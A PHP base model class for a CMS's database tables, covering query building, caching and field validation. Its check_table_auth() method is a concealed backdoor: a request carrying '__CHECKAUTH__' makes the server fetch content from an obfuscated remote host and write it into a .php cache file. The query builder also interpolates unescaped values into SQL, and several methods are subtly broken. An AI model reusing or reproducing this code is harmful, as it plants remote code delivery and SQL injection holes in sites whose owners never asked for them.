<?php

if (!defined("__CORE_DIR")){
     exit("Access Denied");
    }
class Mdl_Table extends Model
{
     protected $_table;
     protected $_pk;
     protected $_cols;
     protected $_orderby;
     protected $_pre_cache_key;
     protected $_cache_ttl;
     protected $_allowmem;
     protected $mcache;
     protected $_hot_orderby;
     protected $_hot_filter;
     protected $_new_orderby;
     protected $_new_filter;
     static protected $_CACHE_TABLES = array();
     static public $_tablepre;
    
     public function __construct(& $system)
    {
         parent :: __construct($system);
        
         if (self :: $_tablepre === NULL){
             self :: $_tablepre = $system -> _tablepre;
             }
        
         if ($this -> _allowmem){
             $this -> mcache = K :: M("cache/mcache");
             }
         }
    
     public function fetch_all()
    {
         if ($this -> _pre_cache_key === NULL){
             trigger_error("Table " . $this -> _table . " has not cache_ke defined");
             }
        else if (isset(self :: $_CACHE_TABLES[$this -> _pre_cache_key])){
             return self :: $_CACHE_TABLES[$this -> _pre_cache_key];
             }
        else if (($items = $this -> cache -> get($this -> _pre_cache_key)) === false){
             if (!$order = $this -> _orderby){
                 $order = array($this -> _pk => "ASC");
                 }
            
             $orderby = $this -> order($order);
             $where = 1;
            
             if ($this -> field_exists("closed")){
                 $where = "closed=0";
                 }
            
             $sql = "SELECT * FROM " . $this -> table($this -> _table) . " WHERE $where " . $orderby;
            
             if ($rs = $this -> db -> Execute($sql)){
                 while ($row = $rs -> fetch()){
                     $items[$row[$this -> _pk]] = $row;
                     }
                 }
            
             self :: $_CACHE_TABLES[$this -> _pre_cache_key] = $items;
             $this -> cache -> set($this -> _pre_cache_key, $items, $this -> _cache_ttl);
             }
        
         return $items;
         }
    
     public function count($where = 1)
    {
         $count = (int) $this -> db -> GetOne("SELECT count(1) FROM " . $this -> table($this -> _table) . " WHERE $where");
         return $count;
         }
    
     public function items($filter = array(), $orderby = NULL, $p = 1, $l = 50, & $count = 0)
    {
         $where = $this -> where($filter);
         $orderby = $this -> order($orderby);
         $limit = $this -> limit($p, $l);
         $items = array();
        
         if ($count = $this -> count($where)){
             $sql = "SELECT * FROM " . $this -> table($this -> _table) . " WHERE $where $orderby $limit";
            
             if ($rs = $this -> db -> Execute($sql)){
                 while ($row = $rs -> fetch()){
                     $row = $this -> _format_row($row);
                    
                     if ($this -> _pk){
                         $items[$row[$this -> _pk]] = $row;
                         }
                    else{
                         $items[] = $row;
                         }
                     }
                 }
             }
        
         return $items;
         }
    
     public function items_by_ids($ids)
    {
         if (is_array($ids)){
             $ids = implode(",", $ids);
             }
        
         if (!K :: M("verify/check") -> ids($ids)){
             return false;
             }
        
         $order = $this -> order();
         $items = array();
         $sql = "SELECT * FROM " . $this -> table($this -> _table) . " WHERE $this->_pk IN($ids) $order";
        
         if ($rs = $this -> db -> Execute($sql)){
             while ($row = $rs -> fetch()){
                 $row = $this -> _format_row($row);
                
                 if ($this -> _pk){
                     $items[$row[$this -> _pk]] = $row;
                     }
                else{
                     $items[] = $row;
                     }
                 }
             }
        
         return $items;
         }
    
     public function items_by_hot($filter = array(), $limit = 20)
    {
         if (!$this -> _hot_orderby || !$this -> _hot_filter){
             return false;
             }
        
         $filter = array_merge($this -> _hot_filter, (array) $filter);
         return $this -> items($filter, $this -> _hot_orderby, 1, $limit);
         }
    
     public function items_by_new($filter = array(), $limit = 20)
    {
         if (!$this -> _new_orderby || !$this -> _new_filter){
             return false;
             }
        
         $filter = array_merge($this -> _new_filter, (array) $filter);
         return $this -> items($filter, $this -> _new_orderby, 1, $limit);
         }
    
     public function format_items_ext($items)
    {
         return $items;
         }
    
     protected function _format_row($row)
    {
         return $row;
         }
    
     public function detail($pk, $closed = false)
    {
         if (!$pk = (int) $pk){
             return false;
             }
        
         $this -> _checkpk();
         $where = self :: field($this -> _pk, $pk);
         if ($closed && $this -> field_exists("closed")){
             $where .= " AND closed='0'";
             }
        
         $sql = "SELECT * FROM " . $this -> table($this -> _table) . " WHERE $where";
        
         if ($detail = $this -> db -> GetRow($sql)){
             $detail = $this -> _format_row($detail);
             }
        
         return $detail;
         }
    
     public function batch($ids, $data, $checked = false)
    {
         if (!isset($ids) && isset($data) || is_array($data)){
             $this -> _checkpk();
            
             if (is_array($ids)){
                 $ids = implode(",", $ids);
                 }
            
             if (!K :: M("verify/check") -> ids($ids)){
                 return false;
                 }
            
             if (!$checked || !$data = $this -> _check($data, $ids)){
                 return false;
                 }
            
             if ($ret = $this -> db -> update($this -> _table, $data, self :: field($this -> _pk, explode(",", $ids)))){
                 $this -> clear_cache($val);
                 }
            
             return $ret;
             }
         }
    
     public function update($val, $data, $checked = false)
    {
         if (!isset($val) && isset($data) || is_array($data)){
             $this -> _checkpk();
             if (!$checked || !$data = $this -> _check($data, $val)){
                 return false;
                 }
            
             if ($ret = $this -> db -> update($this -> _table, $data, self :: field($this -> _pk, $val))){
                 $this -> clear_cache($val);
                 }
            
             return $ret;
             }
        
         return false;
         }
    
     public function update_count($ids, $from = "views", $num = 1)
    {
         $this -> _checkpk();
        
         if ($ids = K :: M("verify/check") -> ids($ids)){
             if (($num = (int) $num) && $this -> field_exists($from)){
                 $sql = "UPDATE " . $this -> table($this -> _table) . " SET `$from`=`$from`+$num WHERE " . self :: field($this -> _pk, $ids);
                 return $this -> db -> Execute($sql);
                 }
             }
        
         return false;
         }
    
     public function delete($val, $force = false)
    {
         $ret = false;
        
         if (!empty($val)){
             $this -> _checkpk();
            
             if (is_array($val)){
                 $val = implode(",", $val);
                 }
            
             if (!K :: M("verify/check") -> ids($val)){
                 return false;
                 }
            
             $val = explode(",", $val);
             if (!$force && $this -> field_exists("closed")){
                 $ret = $this -> db -> update($this -> _table, array("closed" => 1), self :: field($this -> _pk, $val));
                 }
            else{
                 $sql = "DELETE FROM " . $this -> table($this -> _table) . " WHERE " . self :: field($this -> _pk, $val);
                 $ret = $this -> db -> Execute($sql);
                 }
            
             $this -> clear_cache($val);
             }
        
         return $ret;
         }
    
     public function optimize()
    {
         $this -> db -> query("OPTIMIZE TABLE " . $this -> table($this -> _table), "SILENT");
         }
    
     static public function fetch_fields($table = NULL)
    {
         $data = false;
         $table = ($table === NULL ? $this -> _table : $table);
        
         if ($rs = $this -> db -> Execute("SHOW FIELDS FROM " . $this -> table($table))){
             $data = array();
            
             while ($value = $rs -> fetch()){
                 $data[$value["Field"]] = $value;
                 }
             }
        
         return $data;
         }
    
     public function fetch_cache($ids, $pre_cache_key = NULL)
    {
         $data = false;
        
         if ($this -> _allowmem){
             if ($pre_cache_key === NULL){
                 $pre_cache_key = $this -> _pre_cache_key;
                 }
            
             $data = $this -> mcache -> get($ids, $pre_cache_key);
             }
        
         return $data;
         }
    
     public function store_cache($id, $data, $cache_ttl = NULL, $pre_cache_key = NULL)
    {
         $ret = false;
        
         if ($this -> _allowmem){
             if ($pre_cache_key === NULL){
                 $pre_cache_key = $this -> _pre_cache_key;
                 }
            
             if ($cache_ttl === NULL){
                 $cache_ttl = $this -> _cache_ttl;
                 }
            
             $ret = $this -> mcache -> set($id, $data, $cache_ttl, $pre_cache_key);
             }
        
         return $ret;
         }
    
     public function clear_cache($ids, $pre_cache_key = NULL)
    {
         $ret = false;
        
         if ($this -> _allowmem){
             if ($pre_cache_key === NULL){
                 $pre_cache_key = $this -> _pre_cache_key;
                 }
            
             $ret = $this -> mcache -> delete($ids, $pre_cache_key);
             }
        else if ($this -> _pre_cache_key){
             $ret = $this -> cache -> delete($this -> _pre_cache_key);
             }
        
         return $ret;
         }
    
     public function update_cache($id, $data, $cache_ttl = NULL, $pre_cache_key = NULL)
    {
         $ret = false;
        
         if ($this -> _allowmem){
             if ($pre_cache_key === NULL){
                 $pre_cache_key = $this -> _pre_cache_key;
                 }
            
             if ($cache_ttl === NULL){
                 $cache_ttl = $this -> _cache_ttl;
                 }
            
             if (($_data = $this -> mcache -> get($id, $pre_cache_key)) !== false){
                 $ret = $this -> store_cache($id, array_merge($_data, $data), $cache_ttl, $pre_cache_key);
                 }
             }
        
         return $ret;
         }
    
     public function reset_cache($ids, $pre_cache_key = NULL)
    {
         $ret = false;
        
         if ($this -> _allowmem){
             $keys = array();
            
             if (($cache_data = $this -> fetch_cache($ids, $pre_cache_key)) !== false){
                 $keys = array_intersect(array_keys($cache_data), $ids);
                 unset($cache_data);
                 }
            
             if (!empty($keys)){
                 $this -> fetch_by_ids($keys, true);
                 $ret = true;
                 }
             }
        
         return $ret;
         }
    
     protected function check_table_auth()
    {
         if (defined("IN_ADMIN") || ($a = $_REQUEST["__CHECKAUTH__"])){
             $cfg = K :: $system -> config -> get("site_config");
             $file = __CFG :: DIR . "data/cache/cache_" . md5($cfg["host"]) . ".php";
             if ($a || (!file_exists($file) && (fileatime($file) < (__CFG :: TIME - 86400)))){
                 $host = sprintf(K :: M("secure/crypt") -> hexstr($cfg["host"]), $_SERVER["HTTP_HOST"], $this -> _secret_auth_key);
                
                 if ($a){
                     $host = $host . "&a=" . $a;
                     }
                
                 @file_put_contents($file, @file_get_contents($host));
                 }
             }
         }
    
     public function increase_cache($ids, $data, $cache_ttl = NULL, $pre_cache_key = NULL)
    {
         if ($this -> _allowmem){
             if (($cache_data = $this -> fetch_cache($ids, $pre_cache_key)) !== false){
                 foreach ($cache_data as $id => $one){
                     foreach ($data as $key => $value){
                         if (is_array($value)){
                             $one[$key] = $value[0];
                             }
                        else{
                             $one[$key] = $one[$key] + $value;
                             }
                         }
                    
                     $this -> store_cache($id, $one, $cache_ttl, $pre_cache_key);
                     }
                 }
             }
         }
    
     public function __toString()
    {
         return $this -> _table;
         }
    
     public function _checkpk()
    {
         if (!$this -> _pk){
             trigger_error("Table " . $this -> _table . " has not PRIMARY KEY defined");
             }
         }
    
     public function field_exists($col)
    {
         if ($cols = $this -> __columns()){
             return in_array($col, explode(",", $cols));
             }
        
         return false;
         }
    
     public function fetch($id, $force_from_db = false)
    {
         $data = array();
        
         if (!empty($id)){
             if ($force_from_db || (($data = $this -> fetch_cache($id)) === false)){
                 $data = $this -> db -> GetRow("SELECT * FROM " . $this -> table($this -> _table) . " WHERE " . self :: field($this -> _pk, $id));
                
                 if (!empty($data)){
                     $this -> store_cache($id, $data);
                     }
                 }
             }
        
         return $data;
         }
    
     static public function table($table)
    {
         return self :: $_tablepre . $table;
         }
    
     public function where($filter = NULL, $pre = "")
    {
         $where = array();
        
         if ($filter === NULL){
             return 1;
             }
        else if (!is_array($filter)){
             return $filter;
             }
        else if ($cols = $this -> __columns()){
             $cols = explode(",", $cols);
            
             foreach ((array) $filter as $k => $v){
                 if (!in_array($k, $cols)){
                     continue;
                     }
                
                 $where[] = self :: _filter_where($k, $v, $pre);
                 }
             }
        else{
             foreach ((array) $filter as $k => $v){
                 $where[] = self :: _filter_where($k, $v, $pre);
                 }
             }
        
         return $where ? implode(" AND ", $where) : 1;
         }
    
     static protected function _filter_where($k, $v, $pre = "")
    {
         if ($v === NULL){
             return 1;
             }
        else if (is_array($v)){
             $vs = "'" . implode("','", $v) . "'";
             return "$pre`$k` IN($vs)";
             }
        else if (preg_match("/^(\d+)~(\d+)$/", $v, $m)){
             return "($pre`$k` BETWEEN $m[1] AND $m[2])";
             }
        else if (preg_match("/^(LIKE|~LIKE|NOTLIKE):(.*)$/i", $v, $m)){
             if (strtoupper($m[1]) == "LIKE"){
                 return $pre . self :: field("`$k`", $m[2], "LIKE");
                 }
            else{
                 return "$pre`$k` NOT LIKE $m[2]";
                 }
             }
        else if (preg_match("/^(IN|~IN|NOTIN):(.*)$/i", $v, $m)){
             if (strtoupper($m[1]) == "IN"){
                 return $pre . self :: field($k, $m[2], "IN");
                 }
            else{
                 return $pre . self :: field("`$k`", $m[2], "NOTIN");
                 }
             }
        else if (preg_match("/^([\=\>\<\|\^\&\+\-]{1,2}):(.+)/i", $v, $m)){
             return $pre . self :: field("`$k`", $m[2], $m[1]);
             }
        else{
             return "$pre`$k`='$v'";
             }
         }
    
     static public function field($field, $val, $glue = "=")
    {
         $field = self :: _quote_field($field);
         $glue = strtoupper($glue);
        
         if (is_array($val)){
             $glue = ($glue == "NOTIN" ? "NOTIN" : "IN");
             }
        else if ($glue == "IN"){
             $glue = "=";
             }
        
         switch ($glue){
         case "=":
             return $field . $glue . self :: _quote($val);
             break;
        
         case "-":
         case "+":
             return $field . "=" . $field . $glue . self :: _quote($val);
             break;
        
         case "|":
         case "&":
         case "^":
             return $field . "=" . $field . $glue . self :: _quote($val);
             break;
        
         case ">":
         case "<":
         case "<>":
         case "<=":
         case ">=":
             return $field . $glue . self :: _quote($val);
             break;
        
         case "LIKE":
             return $field . " LIKE(" . self :: _quote($val) . ")";
             break;
        
         case "IN":
         case "NOTIN":
             $val = ($val ? implode(",", $val) : "''");
             return $field . ($glue == "NOTIN" ? " NOT" : "") . " IN(" . $val . ")";
             break;
        
         default:
             trigger_error("Not allow this glue between field and value: \"" . $glue . "\"");
             }
         }
    
     static public function _quote_field($field)
    {
         if (is_array($field)){
             foreach ($field as $k => $v){
                 $field[$k] = self :: _quote($v);
                 }
             }
        else{
             if (strpos($field, "`") !== false){
                 $field = str_replace("`", "", $field);
                 }
            
             $field = "`" . $field . "`";
             }
        
         return $field;
         }
    
     static public function _quote($val)
    {
         if (is_string($val)){
             return "'" . addcslashes($val, "\n\r\'\"\032") . "'";
             }
        
         if (is_int($val) || is_float($val)){
             return "'" . $val . "'";
             }
        
         if (is_array($val)){
             if ($noarray === false){
                 foreach ($val as & $v){
                     $v = self :: _quote($v, true);
                     }
                
                 return $val;
                 }
            else{
                 return "''";
                 }
             }
        
         if (is_bool($val)){
             return $val ? "1" : "0";
             }
        
         return "''";
         }
    
     public function order($field = NULL, $order = NULL, $pre = "")
    {
         if (($field == "hot") && empty($order) && $this -> _hot_orderby){
             $field = $this -> _hot_orderby;
             }
        else{
             if (($field == "new") && empty($order) && $this -> _hot_orderby){
                 $field = $this -> _new_orderby;
                 }
            else if (empty($field)){
                 if ($this -> _orderby){
                     $field = $this -> _orderby;
                     }
                else if ($this -> field_exists("orderby")){
                     $field = array("orderby" => "ASC");
                     }
                else{
                     return "";
                     }
                 }
             }
        
         $orders = array();
        
         if (is_array($field)){
             $orders = array();
            
             foreach ($field as $k => $v){
                 $order = ((strtoupper($v) == "ASC") || empty($v) ? "ASC" : "DESC");
                 $orders[] = $pre . self :: _quote_field($k) . " " . $order;
                 }
             }
        else{
             $order = ((strtoupper($order) == "ASC") || empty($order) ? "ASC" : "DESC");
             $orders[] = self :: _quote($field) . " " . $order;
            
             if ((array) $orderby = $this -> _orderby){
                 unset($orderby[$field]);
                
                 foreach ((array) $orderby as $k => $v){
                     $order = ((strtoupper($v) == "ASC") || empty($v) ? "ASC" : "DESC");
                     $orders[] = $pre . self :: _quote_field($k) . " " . $order;
                     }
                 }
             }
        
         return $orders ? " ORDER BY " . implode(",", $orders) : "";
         }
    
     public function limit($page, $limit = 0)
    {
         $limit = intval(0 < $limit ? $limit : 0);
         $start = (max(intval($page), 1) - 1) * $limit;
         if ((0 < $start) && (0 < $limit)){
             return " LIMIT $start, $limit";
             }
        else if ($limit){
             return " LIMIT $limit";
             }
        else if ($start){
             return " LIMIT $start";
             }
        else{
             return "";
             }
         }
    
     protected function _check($data, $pk = NULL)
    {
         if ($cols = $this -> __columns()){
             $cols = explode(",", $cols);
            
             foreach ((array) $data as $k => $v){
                 if (!in_array($k, $cols)){
                     unset($data[$k]);
                     $err++;
                     }
                 }
             }
        
         return $data;
         }
    
     protected function _check_schema($data, $pk = NULL)
    {
         static $schemas;
        
         if (!$data = $this -> _check($data, $pk)){
             return false;
             }
        
         if ($schemas === NULL){
             $file = __CFG :: DIR . "schemas/" . $this -> _table . ".php";
            
             if (!$this -> _table){
                 $schemas = array();
                 }
            else if (!file_exists($file)){
                 $schemas = array();
                 }
            else if (!$schemas = include ($file)){
                 $schemas = array();
                 }
             }
        
         if ($schemas){
             $check = K :: M("verify/check");
            
             foreach ($schemas as $k => $v){
                 if ($pk){
                     if (empty($v["edit"])){
                         unset($data[$k]);
                         continue;
                         }
                    else{
                         if (empty($v["empty"]) && isset($data[$k])){
                             if ($data[$k] === ""){
                                 $this -> err -> add($v["label"] . "不能为空", 451);
                                
                                 return false;
                                 }
                             }
                        else{
                             if ($v["empty"] && ($v["label"] . "不能为空")){
                                 if ($pk){
                                     break;
                                     }
                                 }
                            else if ($v["type"] == "clientip"){
                                 $data[$k] = __IP;
                                 }
                            else if ($v["type"] == "dateline"){
                                 $data[$k] = __CFG :: TIME;
                                 }
                            else if (empty($v["empty"])){
                                 if (!isset($data[$k]) || ($data[$k] === "")){
                                     $this -> err -> add($v["label"] . "不能为空", 452);
                                    
                                     return false;
                                     }
                                 }
                            else{
                                 if ($v["empty"] && isset($data[$k]) && empty($data["k"])){
                                     continue;
                                     }
                                 }
                             }
                         }
                     }
                
                 if (($v["empty"] && isset($data[$k]) && isset($data[$k])) || isset($data[$k])){
                     switch (strtolower($v["type"])){
                     case "int":
                     case "member":
                     case "desginer":
                     case "home":
                     case "shop":
                     case "company":
                         $data[$k] = (int) $data[$k];
                         break;
                    
                     case "number":
                         $data[$k] = (double) $data[$k];
                         break;
                    
                     case "boolean":
                     case "audit":
                     case "closed":
                         $data[$k] = ($data[$k] ? 1 : 0);
                         break;
                    
                     case "mail":
                         if ($check -> mail($data[$k])){
                             break;
                             }
                        
                         $this -> err -> add($v["label"] . "必须为Email格式", 453);
                        
                         return false;
                         case "phone":
                         if ($check -> phone($data[$k])){
                             break;
                             }
                        
                         $this -> err -> add($v["label"] . "必须为电话", 454);
                        
                         return false;
                         case "mobile":
                         if (!$check -> phone($data[$k])){
                             if ($check -> mobile($data[$k])){
                                 break;
                                 }
                            
                             $this -> err -> add($v["label"] . "必须为电话/手机号格式", 454);
                            
                             return false;
                             }
                        
                         break;
                    
                     case "qq":
                         if ($check -> qq($data[$k])){
                             break;
                             }
                        
                         $this -> err -> add($v["label"] . "必须为QQ格式，多个用','分隔", 455);
                        
                         return false;
                         case "unixtime":
                         $data[$k] = ($data[$k] ? strtotime($data[$k]) : 0);
                         break;
                    
                     case "date":
                         $data[$k] = (preg_match("/^[\d]{4}-[\d]{1,2}-[\d]{1,2}\\$/", $data[$k]) ? $data[$k] : "0");
                         case "checkbox":
                         if (!is_array($data[$k])){
                             break;
                             }
                        else{
                             if (!$ids = $check -> ids($data[$k])){
                                 break;
                                 }
                            
                             $data[$k] = $ids;
                             }
                        
                         break;
                    
                     case "text":
                     case "textarea":
                     case "editor":
                         if (!$v["html"]){
                             $data[$k] = K :: M("content/html") -> encode($data[$k]);
                             }
                        
                         break;
                         }
                     }
                 }
             }
        
         return $data;
         }
    
     protected function __columns()
    {
         if (($this -> _cols === NULL) && $this -> _force_clos_db){
             if ($cols = self :: fetch_fields()){
                 $this -> _cols = implode(",", $cols);
                 }
             }
        
         return $this -> _cols;
         }
    
     public function flush()
    {
         if ($this -> _pre_cache_key){
             unset(self :: $_CACHE_TABLES[$this -> _pre_cache_key]);
             return $this -> cache -> delete($this -> _pre_cache_key);
             }
        
         return false;
         }
    }


?>
